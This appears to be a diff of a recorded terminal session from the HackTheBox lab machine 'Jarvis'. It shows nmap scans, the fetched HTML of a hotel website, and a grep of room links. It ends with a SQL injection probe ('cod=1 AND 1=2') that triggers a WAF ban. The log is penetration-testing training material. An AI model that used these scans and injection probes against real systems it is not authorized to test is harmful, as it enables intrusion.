@@ -1,72 +1,1077 @@
 
-=== SESSION START: 2026-09-03 22:53:37 | Box: Jarvis | IP: 10.129.229.137 | Platform: HackTheBox ===
+=== SESSION START: 2026-09-04 10:00:03 | Box: Jarvis | IP: 10.129.1.73 | Platform: HackTheBox ===
 
-=== SESSION RECONNECT: 2026-09-03 22:53:52 ===
+$ [10:00:08] htblog
 
-=== SESSION RECONNECT: 2026-09-03 22:53:59 ===
+=== OUTPUT CAPTURE START: 2026-09-04 10:00:08 ===
 
-=== SESSION RECONNECT: 2026-09-03 22:54:05 ===
+$ [10:00:19] sudo nmap -sT -Pn -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
 
-=== SESSION RECONNECT: 2026-09-03 22:54:13 ===
+$ [10:01:04] sudo nmap -sT -Pn -sC -sV -p 22,80,64999 -oA nmap/${BoxName}_services $BoxIP
 
-=== SESSION RECONNECT: 2026-09-03 22:54:19 ===
+$ [10:02:34] curl -i --max-time 15 "http://$BoxIP/" | tee loot/http_root_full.txt
+curl -i --max-time 15 "http://$BoxIP:64999/" | tee loot/http_64999_full.txt
+Script started on 2026-09-04 10:00:08+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="238" LINES="53"]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:00:08][39m $ [K[?1h=[?2004hsudo nmap -sT -Pn -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP[74D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[65C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 10:00 +0100
+Nmap scan report for 10.129.1.73
+Host is up (0.016s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+64999/tcp open  unknown
 
-=== SESSION RECONNECT: 2026-09-03 22:54:29 ===
+Nmap done: 1 IP address (1 host up) scanned in 5.44 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:00:27][39m $ [K[?1h=[?2004hsudo nmap -sT -Pn -sC -sV -p 22,80,64999 -oA nmap/${BoxName}_services $BoxIP[76D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[67C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 10:01 +0100
+Nmap scan report for 10.129.1.73
+Host is up (0.015s latency).
 
-=== SESSION RECONNECT: 2026-09-03 22:55:00 ===
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Stark Hotel
+64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-=== SESSION RECONNECT: 2026-09-03 22:56:44 ===
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:01:17][39m $ [K[?1h=[?2004hcurl -i --max-time 15 "http://$BoxIP/" | tee loot/http_root_full.txt
+curl -i --max-time 15 "http://$BoxIP:64999/" | tee loot/http_64999_full.txt[K[A[22D[32mc[32mu[32mr[32ml[39m[18C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33m"[39m[3C[32mt[32me[32me[39m[1B[32mc[32mu[32mr[32ml[39m[18C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m:[33m6[33m4[33m9[33m9[33m9[33m/[33m"[39m[3C[32mt[32me[32me[39m[25C[?1l>[?2004l
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0HTTP/1.1 200 OK
+Date: Fri, 04 Sep 2026 09:02:34 GMT
+Server: Apache/2.4.25 (Debian)
+Set-Cookie: PHPSESSID=ij0cb0chfccf73t4cdql937525; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+IronWAF: 2.0.3
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE HTML>
+<html>
+	<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Stark Hotel</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="" />
+	<meta name="keywords" content="" />
+	<meta name="author" content="" />
 
-=== SESSION RECONNECT: 2026-09-03 22:56:53 ===
+  <!-- Facebook and Twitter integration -->
+	<meta property="og:title" content=""/>
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content=""/>
+	<meta property="og:site_name" content=""/>
+	<meta property="og:description" content=""/>
+	<meta name="twitter:title" content="" />
+	<meta name="twitter:image" content="" />
+	<meta name="twitter:url" content="" />
+	<meta name="twitter:card" content="" />
 
-=== SESSION RECONNECT: 2026-09-03 22:57:00 ===
+	
+	
+	<!-- Animate.css -->
+	<link rel="stylesheet" href="css/animate.css">
+	<!-- Icomoon Icon Fonts-->
+	<link rel="stylesheet" href="css/icomoon.css">
+	<!-- Bootstrap  -->
+	<link rel="stylesheet" href="css/bootstrap.css">
 
-=== SESSION RECONNECT: 2026-09-03 22:57:06 ===
+	<!-- Magnific Popup -->
+	<link rel="stylesheet" href="css/magnific-popup.css">
 
-=== SESSION RECONNECT: 2026-09-03 22:57:13 ===
+	<!-- Flexslider  -->
+	<link rel="stylesheet" href="css/flexslider.css">
 
-=== SESSION RECONNECT: 2026-09-03 22:57:21 ===
+	<!-- Owl Carousel -->
+	<link rel="stylesheet" href="css/owl.carousel.min.css">
+	<link rel="stylesheet" href="css/owl.theme.default.min.css">
+	
+	<!-- Date Picker -->
+	<link rel="stylesheet" href="css/bootstrap-datepicker.css">
+	<!-- Flaticons  -->
+	<link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
 
-=== SESSION RECONNECT: 2026-09-03 22:57:33 ===
+	<!-- Theme style  -->
+	<link rel="stylesheet" href="css/style.css">
 
-=== SESSION RECONNECT: 2026-09-03 22:57:40 ===
+	<!-- Modernizr JS -->
+	<script src="js/modernizr-2.6.2.min.js"></script>
+	<!-- FOR IE9 below -->
+	<!--[if lt IE 9]>
+	<script src="js/respond.min.js"></script>
+	<![endif]-->
 
-=== SESSION RECONNECT: 2026-09-03 22:57:49 ===
+	</head>
+	<body>
+		
+	<div class="colorlib-loader"></div>
 
-=== SESSION RECONNECT: 2026-09-03 22:57:56 ===
+	<div id="page">
+		<nav class="colorlib-nav" role="navigation">
+			<div class="top">
+				<div class="container">
+					<div class="row">
+						<div class="col-xs-4">
+							<p class="site">supersecurehotel.htb</p>
+						</div>
+						<div class="col-xs-8 text-right">
+							<p class="num">Call: +123456789</p>
+							<ul class="colorlib-social">
+                <li><a href="#">Sign in </li>                <li><a href="#">Utilities</a></li>
+								<li><a href="#"><i class="icon-twitter"></i></a></li>
+								<li><a href="#"><i class="icon-facebook"></i></a></li>
+								<li><a href="#"><i class="icon-linkedin"></i></a></li>
+								<li><a href="#"><i class="icon-dribbble"></i></a></li>
+							</ul>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="top-menu">
+				<div class="container">
+					<div class="row">
+						<div class="col-xs-2">
+							<div id="colorlib-logo"><a href="index.php">Stark Hotel</a></div>
+						</div>
+						<div class="col-xs-10 text-right menu-1">
+							<ul>
+								<li class="active"><a href="index.php">Home</a></li>
+								<li class="has-dropdown">
+									<a href="rooms-suites.php">Rooms</a>
+								</li>
+								<li><a href="dining-bar.php">Dining &amp; Bar</a></li>
+						
+							</ul>
+						</div>
+					</div>
+				</div>
+			</div>
+		</nav>
+		<aside id="colorlib-hero">
+			<div class="flexslider">
+				<ul class="slides">
+			   	<li style="background-image: url(images/img_bg_5.jpg);">
+			   		<div class="overlay"></div>
+			   		<div class="container-fluid">
+			   			<div class="row">
+				   			<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
+				   				<div class="slider-text-inner text-center">
+				   					<h2>Welcome to the Stark Hotel</h2>
+				   					<h1>A Luxury Hotel</h1>
+										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
+				   				</div>
+				   			</div>
+				   		</div>
+			   		</div>
+			   	</li>
+			   	<li style="background-image: url(images/img_bg_1.jpg);">
+			   		<div class="overlay"></div>
+			   		<div class="container-fluid">
+			   			<div class="row">
+				   			<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
+				   				<div class="slider-text-inner text-center">
+				   					<h2>Discover &amp; Enjoy</h2>
+				   					<h1>Everything you need in Stark Hotel</h1>
+										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
+				   				</div>
+				   			</div>
+				   		</div>
+			   		</div>
+			   	</li>
+			   	<li style="background-image: url(images/img_bg_3.jpg);">
+			   		<div class="overlay"></div>
+			   		<div class="container-fluids">
+			   			<div class="row">
+				   			<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
+				   				<div class="slider-text-inner text-center">
+				   					<h2>You are invited</h2>
+				   					<h1>We know how to please you</h1>
+										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
+				   				</div>
+				   			</div>
+				   		</div>
+			   		</div>
+			   	</li>
+			   	<li style="background-image: url(images/img_bg_4.jpg);">
+			   		<div class="overlay"></div>
+			   		<div class="container-fluid">
+			   			<div class="row">
+				   			<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
+				   				<div class="slider-text-inner text-center">
+				   					<h2>Come &amp; enjoy the unforgetable nights</h2>
+				   					<h1>In the heart of Stark Hotel</h1>
+										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
+				   				</div>
+				   			</div>
+				   		</div>
+			   		</div>
+			   	</li>	   	
+			  	</ul>
+		  	</div>
+		</aside>
+		<div id="colorlib-services">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-3 animate-box text-center">
+						<div class="services">
+							<span class="icon">
+								<i class="flaticon-reception"></i>
+							</span>
+							<h3>24/7 Front Desk</h3>
+							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
+						</div>
+					</div>
+					<div class="col-md-3 animate-box text-center">
+						<div class="services">
+							<span class="icon">
+								<i class="flaticon-herbs"></i>
+							</span>
+							<h3>Spa Suites</h3>
+							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
+						</div>
+					</div>
+					<div class="col-md-3 animate-box text-center">
+						<div class="services">
+							<span class="icon">
+								<i class="flaticon-car"></i>
+							</span>
+							<h3>Transfer Services</h3>
+							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
+						</div>
+					</div>
+					<div class="col-md-3 animate-box text-center">
+						<div class="services">
+							<span class="icon">
+								<i class="flaticon-cheers"></i>
+							</span>
+							<h3>Restaurant &amp; Bar</h3>
+							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:03 ===
+		<div id="colorlib-rooms" class="colorlib-light-grey">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-6 col-md-offset-3 text-center colorlib-heading animate-box">
+						<span><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
+						<h2>Rooms &amp; Suites</h2>
+						<p>We love to tell our successful far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-md-12 animate-box">
+						<div class="owl-carousel owl-carousel2">
+              <div class="item">
+								<a href="/images/room-6.jpg" class="room image-popup-link" style="background-image: url(/images/room-6.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=1">Superior Family Room</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">270</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Perfect for traveling couples</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
+									</ul>
+									<p><a href="room.php?cod=1" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div><div class="item">
+								<a href="/images/room-1.jpg" class="room image-popup-link" style="background-image: url(/images/room-1.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=2">Suite</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">149</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Only 10 rooms are available</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
+									</ul>
+									<p><a href="room.php?cod=2" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div><div class="item">
+								<a href="/images/room-2.jpg" class="room image-popup-link" style="background-image: url(/images/room-2.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=3">Double Room</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">199</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Perfect for traveling couples</li>		<li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
+									</ul>
+									<p><a href="room.php?cod=3" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div><div class="item">
+								<a href="/images/room-3.jpg" class="room image-popup-link" style="background-image: url(/images/room-3.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=4">Family Room</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">249</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Two double beds</li><li><i class="icon-check"></i> Babysitting facilities</li><li><i class="icon-check"></i> 1 free bed available on request</li>
+									</ul>
+									<p><a href="room.php?cod=4" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div><div class="item">
+								<a href="/images/room-4.jpg" class="room image-popup-link"100  2362 style="background-image: url(/images/room-4.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=5">Classic Double Room</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">179</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Only 10 rooms are available</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
+									</ul>
+									<p><a href="room.php?cod=5" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div><div class="item">
+								<a href="/images/room-6.jpg" class="room image-popup-link" style="background-image: url(/images/room-6.jpg);"></a>
+								<div class="desc text-center">
+									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
+									<h3><a href="/room.php?cod=6">Superior Family Room</a></h3>
+									<p class="price">
+										<span class="currency">$</span>
+										<span class="price-room">360</span>
+										<span class="per">/ per night</span>
+									</p>
+									<ul>
+										<li><i class="icon-check"></i> Perfect for traveling couples</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
+									</ul>
+									<p><a href="room.php?cod=6" class="btn btn-primary btn-book">Book now!</a></p>
+								</div>
+							</div>							
+						</div>
+					</div>
+					<div class="col-md-12 text-center animate-box">
+						<a href="rooms-suites.php">View all rooms <i class="icon-arrow-right3"></i></a>
+					</div>
+				</div>
+			</div>
+		</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:15 ===
 
-=== SESSION RECONNECT: 2026-09-03 22:58:27 ===
+		<div id="colorlib-dining-bar">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-6 col-md-offset-3 text-center colorlib-heading animate-box">
+						<span><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
+						<h2>Dining &amp; Bar</h2>
+						<p>We love to tell our successful far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
+					</div>
+				</div>
+				<div class="row">
+					<div class="diningbar-flex">
+						<div class="half animate-box">
+							<ul class="nav nav-tabs text-center" role="tablist">
+								<li role="presentation" class="active"><a href="#mains" aria-controls="mains" role="tab" data-toggle="tab">Mains</a></li>
+								<li role="presentation"><a href="#desserts" aria-controls="desserts" role="tab" data-toggle="tab">Desserts</a></li>
+								<li role="presentation"><a href="#drinks" aria-controls="drinks" role="tab" data-toggle="tab">Drinks</a></li>
+							</ul>
+			            <!-- Tab panes -->
+			            <div class="tab-content">
+								<div role="tabpanel" class="tab-pane active" id="mains">
+									<div class="row">
+										<div class="col-md-12">
+											<ul class="menu-dish">
+							              <li>
+							                <figure class="image"><img src="images/menu-1.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$25.99</span>
+							                  <h3>Grilled Pork</h3>
+							                  <p class="cat">Meat / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-2.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$30.99</span>
+							                  <h3>Tuna Roast Source</h3>
+							                  <p class="cat">Tuna / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$40.00</span>
+							                  <h3>Roast Beef (4 sticks)</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$20.50</span>
+							                  <h3>Salted Fried Chicken</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							            </ul>
+										</div>
+									</div>
+								</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:36 ===
+								<div role="tabpanel" class="tab-pane" id="desserts">
+									<div class="row">
+										<div class="col-md-12">
+											<ul class="menu-dish">
+							              <li>
+							                <figure class="image"><img src="images/menu-1.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$39.90</span>
+							                  <h3>Fried Potatoes with Garlic</h3>
+							                  <p class="cat">Viggies / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$20.99</span>
+							                  <h3>Tuna Roast Source</h3>
+							                  <p class="cat">Tuna / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$50.00</span>
+							                  <h3>Roast Beef (4 sticks)</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$29.00</span>
+							                  <h3>Salted Fried Chicken</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							            </ul>
+										</div>
+									</div>
+								</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:44 ===
+								<div role="tabpanel" class="tab-pane" id="drinks">
+									<div class="row">
+										<div class="col-md-12">
+											<ul class="menu-dish">
+							              <li>
+							                <figure class="image"><img src="images/menu-8.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$25.00</span>
+							                  <h3>Fried Potatoes with Garlic</h3>
+							                  <p class="cat">Viggies / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-9.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$20.50</span>
+							                  <h3>Tuna Roast Source</h3>
+							                  <p class="cat">Tuna / Potatoes8   0  23628   0      0 443.0k      0                              0100  23628   0  23628   0      0 441.3k      0                              0100  23628   0  23628   0      0 439.2k      0                              0
+ / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$30.00</span>
+							                  <h3>Roast Beef (4 sticks)</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							              <li>
+							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
+							                <div class="text">
+							                  <span class="price">$29.99</span>
+							                  <h3>Salted Fried Chicken</h3>
+							                  <p class="cat">Crab / Potatoes / Rice</p>
+							                </div>
+							              </li>
+							            </ul>
+										</div>
+									</div>
+								</div>
+			            </div>
+			         </div><!-- end half -->
+			         <div class="half diningbar-img" style="background-image: url(images/cover_img_1.jpg);"></div><!-- end half -->
+			      </div>
+			   </div>
+	      </div>
+		</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:51 ===
+		
+	
+		<footer id="colorlib-footer" role="contentinfo">
+			<div class="container">
+				<div class="row row-pb-md">
+					<div class="col-md-3 colorlib-widget">
+						<h4>	<title>Stark Hotel</title></h4>
+						<p>Luxury hotel where you can feel cool although in reality you are a fool</p>
+						<p>
+							<ul class="colorlib-social-icons">
+								<li><a href="#"><i class="icon-twitter"></i></a></li>
+								<li><a href="#"><i class="icon-facebook"></i></a></li>
+								<li><a href="#"><i class="icon-linkedin"></i></a></li>
+								<li><a href="#"><i class="icon-dribbble"></i></a></li>
+							</ul>
+						</p>
+					</div>
+					<div class="col-md-3 colorlib-widget">
+						<h4>Quick Links</h4>
+						<p>
+							<ul class="colorlib-footer-links">
+								<li><a href="#">Dining &amp; Bar</a></li>
+							</ul>
+						</p>
+					</div>
+					<div class="col-md-3 col-md-push-1">
+						<h4>Contact Information</h4>
+						<ul class="colorlib-footer-links">
+							<li>291 South 21th Street, <br> Suite 721 New York NY 10016</li>
+							<li><a href="#">+ 1235 2355 98</a></li>
+							<li><a href="#">supersecurehotel@logger.htb</a></li>
+							<li><a href="#">supersecurehotel.htb</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-md-12 text-center">
+						<p>
+							<small class="block">
+Copyright &copy;<script>document.write(new Date().getFullYear());</script>
+						</p>
+					</div>
+				</div>
+			</div>
+		</footer>
+	</div>
 
-=== SESSION RECONNECT: 2026-09-03 22:58:58 ===
+	<div class="gototop js-top">
+		<a href="#" class="js-gotop"><i class="icon-arrow-up2"></i></a>
+	</div>
+	
+	<!-- jQuery -->
+	<script src="js/jquery.min.js"></script>
+	<!-- jQuery Easing -->
+	<script src="js/jquery.easing.1.3.js"></script>
+	<!-- Bootstrap -->
+	<script src="js/bootstrap.min.js"></script>
+	<!-- Waypoints -->
+	<script src="js/jquery.waypoints.min.js"></script>
+	<!-- Flexslider -->
+	<script src="js/jquery.flexslider-min.js"></script>
+	<!-- Owl carousel -->
+	<script src="js/owl.carousel.min.js"></script>
+	<!-- Magnific Popup -->
+	<script src="js/jquery.magnific-popup.min.js"></script>
+	<script src="js/magnific-popup-options.js"></script>
+	<!-- Date Picker -->
+	<script src="js/bootstrap-datepicker.js"></script>
+	<!-- Main -->
+	<script src="js/main.js"></script>
 
-=== SESSION RECONNECT: 2026-09-03 22:59:04 ===
+	</body>
+</html>
 
-=== SESSION RECONNECT: 2026-09-03 22:59:11 ===
+  % Total    % Received % Xferd  Average Speed  Time    Time    
+$ [10:07:12] curl -sS --max-time 15 "http://$BoxIP/rooms-suites.php" | tee loot/rooms-suites-full.html >/dev/null
+grep -nEi 'room.php|cod=' loot/rooms-suites-full.html | head -10
 
-=== SESSION RECONNECT: 2026-09-03 22:59:35 ===
+$ [10:08:41] curl -sS --max-time 15 -D - -o loot/room_cod_false.html "http://$BoxIP/room.php?cod=1%20AND%201=2"
+grep -nE 'room.php|price-room' loot/room_cod_false.html | head -5
+Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100     54 100     54   0      0   1680      0                              0100     54 100     54   0      0   1667      0                              0100     54 100     54   0      0   1648      0                              0
+HTTP/1.1 200 OK
+Date: Fri, 04 Sep 2026 09:02:34 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Mon, 04 Mar 2019 02:10:40 GMT
+ETag: "36-5833b43634c39"
+Accept-Ranges: bytes
+Content-Length: 54
+IronWAF: 2.0.3
+Content-Type: text/html
+
+Hey you have been banned for 90 seconds, don't be bad
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:02:34][39m $ [K[?1h=[?2004hcurl -sS --max-time 15 "http://$BoxIP/rooms-suites.php" | tee loot/rooms-suites-full.html >/dev/null
+grep -nEi 'room.php|cod=' loot/rooms-suites-full.html | head -10[K[A[11D[32mc[32mu[32mr[32ml[39m[19C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mr[33mo[33mo[33mm[33ms[33m-[33ms[33mu[33mi[33mt[33me[33ms[33m.[33mp[33mh[33mp[33m"[39m[3C[32mt[32me[32me[39m[29C[33m>[39m[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[1B[32mg[32mr[32me[32mp[39m[6C[33m'[33mr[33mo[33mo[33mm[33m.[33mp[33mh[33mp[33m|[33mc[33mo[33md[33m=[33m'[39m[31C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+129:							<h3><a href="/room.php?cod=1">Superior Family Room</a></h3>
+138:							<p><a <a href="/room.php?cod=1" class="btn btn-primary">Book now!</a></p>
+144:							<h3><a href="/room.php?cod=2">Suite</a></h3>
+153:							<p><a <a href="/room.php?cod=2" class="btn btn-primary">Book now!</a></p>
+159:							<h3><a href="/room.php?cod=3">Double Room</a></h3>
+168:							<p><a <a href="/room.php?cod=3" class="btn btn-primary">Book now!</a></p>
+174:							<h3><a href="/room.php?cod=4">Family Room</a></h3>
+183:							<p><a <a href="/room.php?cod=4" class="btn btn-primary">Book now!</a></p>
+189:							<h3><a href="/room.php?cod=5">Classic Double Room</a></h3>
+198:							<p><a <a href="/room.php?cod=5" class="btn btn-primary">Book now!</a></p>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:07:12][39m $ [K[?1h=[?2004hcurl -sS --max-time 15 -D - -o loot/room_cod_false.html "http://$BoxIP/room.php?cod=1%20AND%201=2"
